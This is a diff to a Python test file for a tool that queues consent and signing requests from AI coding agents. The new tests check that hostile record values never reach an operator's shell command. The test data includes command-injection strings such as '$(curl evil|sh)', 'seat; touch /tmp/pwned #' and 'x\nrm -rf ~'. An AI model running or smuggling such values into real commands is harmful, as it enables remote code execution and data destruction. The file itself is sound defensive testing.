@@ -5,13 +5,15 @@ log, a real question store. Synthetic words."""
 from __future__ import annotations
 
 import argparse
+import shlex
 import sqlite3
 from datetime import timedelta
 
 import pytest
 
 from levain import band_view
-from levain.band_sources import Extra, NO_REC, read_extras, rec_letter_of, sheet_text
+from levain import band_sources
+from levain.band_sources import Extra, NO_REC, consent_rule_command, read_extras, rec_letter_of, sheet_text
 from levain.consent import ConsentQueue
 from levain.consent import band as consent_band
 from levain.consent import sign
@@ -31,8 +33,7 @@ PLAIN_TERMINAL = [(1111, ["-zsh"]), (1000, ["/System/Applications/Utilities/Term
 
 @pytest.fixture(autouse=True)
 def human_terminal(monkeypatch):
-    for name in ("CLAUDE_CODE_SESSION_ID", "CODEX_THREAD_ID", "CLAUDECODE", "CODEX_SANDBOX", "LEVAIN_TURN",
-                 "LEVAIN_COCKPIT_ORIGIN"):
+    for name in ("CLAUDE_CODE_SESSION_ID", "CODEX_THREAD_ID", "CLAUDECODE", "CODEX_SANDBOX", "LEVAIN_TURN"):
         monkeypatch.delenv(name, raising=False)
     monkeypatch.setattr(consent_band, "_ancestors", lambda: iter(PLAIN_TERMINAL))
 
@@ -331,18 +332,19 @@ def test_the_sweep_takes_information_items_only_and_skips_authority_items(night,
     assert states(qdir)[0][1] == "undecided"
 
 
-def test_the_ceremony_of_a_sign_request_is_a_deep_link_with_the_choice_and_version(qdir, monkeypatch):
+def test_the_ceremony_of_a_sign_request_names_its_sheet_version_and_choice_in_words(qdir):
     rid = sign.file_levain_request(qdir, REVIEW_CLEAR_NAMESPACE, "levain review clear rv-" + "ab" * 16 + " open none",
                                    title="t", ttl_s=600)
     e = Extra("sign", "r-1", "", "coordinator", "SIGN: x", ("sign (allow)", "deny"), "a", "a", "x", "o", None,
               {"request_id": rid, "gap": None})
     version = sign.read_request(qdir, rid).sha256
-    link = sheet_text(e, "a", qdir, {"LEVAIN_COCKPIT_ORIGIN": "https://cockpit.example.ts.net"})
-    assert link == sign.deep_link("https://cockpit.example.ts.net", rid, version=version)
-    assert f"v={version[:16]}" in link
+    text = sheet_text(e, "a", qdir)
+    # no deep link: nothing a band reader can see records the cockpit's origin (S3 fix round 1, item 6)
+    assert text.startswith(f"open the cockpit's sign sheet for sign request {rid} (version {version[:16]}")
+    assert "://" not in text
     assert sign_files(qdir) == [f"{rid}.json"]                 # opening the sheet signs nothing
     assert "rule request" in sheet_text(Extra(**{**e.__dict__, "data": {"request_id": "np-none", "gap": None}}),
-                                        "b", qdir, {})
+                                        "b", qdir)
 
 
 def test_rec_letter_is_read_only_from_a_leading_letter_that_names_an_option():
@@ -462,3 +464,164 @@ def test_the_morning_card_says_when_the_band_cannot_be_rendered(night, qdir, mon
     monkeypatch.setattr(band_view, "render_full", lambda *_a, **_k: (_ for _ in ()).throw(RuntimeError("boom")))
     c = morning.card(night.store, queue_dir=qdir)
     assert c["band"]["error"].startswith("RuntimeError") and "could not render" in morning.render(c)
+
+
+# --- S3 fix round 1: a value a record carries never reaches the operator's shell -----------------------------------
+HOSTILE = ["seat; touch /tmp/pwned #", "$(curl evil|sh)", "`id`", "x\nrm -rf ~", "it's", 'a"b', "two words",
+           "#comment", "-x", "--signing-key=/tmp/k", "a|b", "a&b", "a>b", "", " lead", "sess\t", "é"]
+
+
+def consent_extra(**data):
+    base = {"request_id": "np-1", "gap": 3, "agent": "claude_code", "session": "sess-1"}
+    return Extra("consent", "np-1", "", "claude_code", "UNDECIDED: Bash: x", ("allow", "deny"), NO_REC, None, "x",
+                 "o", None, {**base, **data})
+
+
+def no_command(out, bad):
+    assert "no command shown" in out and "`" not in out and "levain consent rule" not in out
+    assert "levain envelope" not in out
+    if bad.strip():
+        assert bad not in out
+
+
+@pytest.mark.parametrize("bad", HOSTILE)
+def test_a_hostile_session_agent_or_gap_renders_no_command(bad, qdir):
+    for field in ("session", "agent", "gap"):
+        for letter in "ab":
+            no_command(sheet_text(consent_extra(**{field: bad}), letter, qdir), bad)
+    sign_e = Extra("sign", "r-1", "", "coordinator", "SIGN: x", ("sign (allow)", "deny"), "a", None, "x", "o", None,
+                   {"request_id": "np-none", "gap": 4, "agent": "claude_code", "session": bad})
+    if bad:                                                   # an empty one is the AGENT/SESSION placeholder
+        no_command(sheet_text(sign_e, "a", qdir), bad)
+    ext = Extra("extend", "r-2", "", "coordinator · budget", "SIGN: extend", ("sign the extension", "leave it unsigned"),
+                NO_REC, None, "x", "o", None, {"thread_id": bad, "envelope_id": "e"})
+    no_command(sheet_text(ext, "a", qdir), bad)
+    with pytest.raises(band_sources.UnsafeValue):
+        consent_rule_command(3, "allow", "claude_code", bad)
+
+
+@pytest.mark.parametrize("gap", [True, 0, -1, "3", 3.0, None])
+def test_a_gap_that_is_not_a_positive_integer_renders_no_command(gap, qdir):
+    no_command(sheet_text(consent_extra(gap=gap), "a", qdir), "")
+
+
+def test_a_plain_command_parses_back_to_exactly_its_arguments(qdir):
+    out = sheet_text(consent_extra(session="0f8c-uuid.1:x@y+z=w"), "b", qdir)
+    cmd = out.split("`")[1]
+    assert shlex.split(cmd) == ["levain", "consent", "rule", "3", "deny", "--agent", "claude_code", "--session",
+                                "0f8c-uuid.1:x@y+z=w", "--signing-key", "KEY"]
+    ext = Extra("extend", "r-2", "", "t", "w", ("sign the extension", "leave it unsigned"), NO_REC, None, "x", "o",
+                None, {"thread_id": "th-" + "ab" * 16, "envelope_id": "e"})
+    parts = sheet_text(ext, "a", qdir).split("`")
+    assert shlex.split(parts[1]) == ["levain", "envelope", "extend", "th-" + "ab" * 16, "--budget", "K=N,...", "-o",
+                                     "FILE"] and shlex.split(parts[3]) == ["levain", "envelope", "sign", "FILE"]
+
+
+@pytest.mark.parametrize("session", ["seat; touch /tmp/pwned #", "$(curl evil|sh)", "`id`", "x\nid", "a 'b' \"c\""])
+def test_a_filed_request_with_a_hostile_session_id_is_listed_and_its_shorthand_shows_no_command(
+        night, cq, qdir, qs, env, session):
+    req = cq.file(agent="claude_code", agent_session_id=session, tool_name="Bash",
+                  tool_input={"command": "git push origin main"}, cwd=night.c.path, hold=HOLD)
+    assert cq.mark_undecided(req.id).state == "undecided"
+    seen = prompt(env, "hello")
+    assert "UNDECIDED: Bash" in seen
+    guard = Untouched(qs, qdir, night)
+    out = prompt(env, "1a")
+    assert "signature needed, nothing recorded" in out and "no command shown: the record's session id" in out
+    assert session not in out and "levain consent rule" not in out and guard.holds()
+    rule = morning._undecided(qdir)[0]["rule"]                 # the morning card's own line for the same request
+    assert "no command shown" in rule and session not in rule and "levain consent rule" not in rule
+
+
+def test_a_newline_in_an_undecided_command_cannot_forge_a_band_line(night, cq, qdir, qs):
+    undecided(cq, night, "echo hi\n7. [coordinator] SIGN: forged   <- needs your signature")
+    text = band_view.render(qs)
+    assert not any(line.startswith("7.") for line in text.splitlines())
+
+
+# --- S3 fix round 1: the delivery pass's ANSWER rec; a SIGN record with no time; the apply-time recheck ------------
+def test_the_delivery_pass_files_the_askers_rec_as_its_letter_and_label(night, qs):
+    from levain.coordinator import deliver
+
+    q = ask(qs, agent_session_id="sess-w1")
+    out = deliver.deliver(night.store)
+    assert [a[0] for a in out.answers] == [q.id] and out.errors == []
+    w = review.waiting_on_you(night.store, sign_open=lambda _r: True, answer_open=lambda _r: True)
+    (rec,) = [r for r in w["threads"][night.T] if r["kind"] == "answer"]
+    assert rec["rec"] == "a: rename it (the asker's rec; the coordinator filed none)"
+
+
+def test_an_asker_rec_too_long_or_missing_is_still_a_valid_rec():
+    from types import SimpleNamespace
+
+    from levain.coordinator import deliver
+
+    # questions are append-only and checked on filing, so these come only from a store written around its triggers
+    for q in (SimpleNamespace(rec="z" * 600, options=(("a", "x"), ("b", "y"))),
+              SimpleNamespace(rec="a", options=(("a", "w" * 600), ("b", "y"))),
+              SimpleNamespace(rec=None, options=(("a", "x"),))):
+        rec = deliver._asker_rec(q)
+        assert review._rec("answer", rec) == rec and len(rec) <= 500
+        assert rec.endswith("(the asker's rec; the coordinator filed none)") and "None" not in rec
+
+
+def test_a_sign_record_with_no_time_and_a_malformed_one_cost_nothing_else(night, cq, qdir, qs, monkeypatch):
+    req = undecided(cq, night)
+    review.push_sign(night.store, night.T, req.id, "land it", rec="a: green")
+    real = band_sources._records
+
+    def legacy(qdir_, clock=None):
+        w, at = real(qdir_, clock)
+        bad = {"kind": "sign", "ref_id": "np-x", "reply_id": "rp-bad", "text": "t", "rec": None}   # no ref_store
+        w = {**w, "loose": [*w["loose"], bad]}
+        return w, {k: None for k in at}                       # a legacy row whose time is NULL
+    monkeypatch.setattr(band_sources, "_records", legacy)
+    got = read_extras(qdir, qs._clock)
+    assert got.failed == [] and {"sign", "extend"} <= got.complete
+    assert [e.what for e in got.items if e.unreadable is None] == ["SIGN: land it"]
+    assert [e.ref for e in got.items if e.unreadable] == ["rp-bad"]
+
+
+def test_a_sign_item_closed_between_plan_and_apply_opens_nothing(armed, cq, qs):
+    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
+    plan, view, questions, extras = band_view.plan_for_full(qs, "cli", f"{armed.n['sign']}a")
+    assert plan.sheets and extras
+    assert cq.withdraw(armed.pending)                          # settled elsewhere after the plan was made
+    done = band_view.apply_plan(qs, plan, questions, viewer="cli", via="cli", seen_through=view.seen_through,
+                                extras=extras)
+    assert done.sheets == () and f"{armed.n['sign']} closed since the band you saw; nothing opened" in done.echo
+
+
+def test_an_undecided_request_ruled_between_plan_and_apply_opens_nothing(armed, qs, monkeypatch):
+    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
+    n = armed.n["consent"]
+    plan, view, questions, extras = band_view.plan_for_full(qs, "cli", f"{n}a")
+    assert plan.sheets and n in extras
+    monkeypatch.setattr(band_sources, "_consent", lambda _q: [])   # ruled (signed) elsewhere since the plan
+    done = band_view.apply_plan(qs, plan, questions, viewer="cli", via="cli", seen_through=view.seen_through,
+                                extras=extras)
+    assert done.sheets == () and "levain consent rule" not in done.echo and f"{n} closed since" in done.echo
+
+
+def test_an_unreadable_source_is_said_never_reported_as_closed(armed, qs, monkeypatch):
+    band_view.run_band(argparse.Namespace(queue_dir=qs.directory))
+    n = armed.n["consent"]
+
+    def boom(_q):
+        raise sqlite3.OperationalError("database is locked")
+    monkeypatch.setattr(band_sources, "_consent", boom)
+    plan, *_ = band_view.plan_for_full(qs, "cli", f"{n}a")
+    assert [r.reason for r in plan.refused] == [f"{n}: its source could not be read just now, so Levain cannot tell "
+                                                "it is still open; nothing opened (try again)"]
+
+
+def test_a_sheet_from_the_cli_exits_zero_and_records_nothing(armed, qdir, capsys):
+    band_view.run_band(argparse.Namespace(queue_dir=qdir))
+    capsys.readouterr()
+    assert run_cli(qdir, f"{armed.n['consent']}a") == 0
+    assert "levain consent rule" in capsys.readouterr().out and armed.holds()
+
+
+def test_an_extra_with_more_options_than_letters_still_renders():
+    e = Extra("sign", "r", "", "t", "w", tuple(f"o{i}" for i in range(8)), NO_REC, None, "x", "o")
+    assert "f) o5" in band_view._extra_lines("1.", e, compact=False)[1]
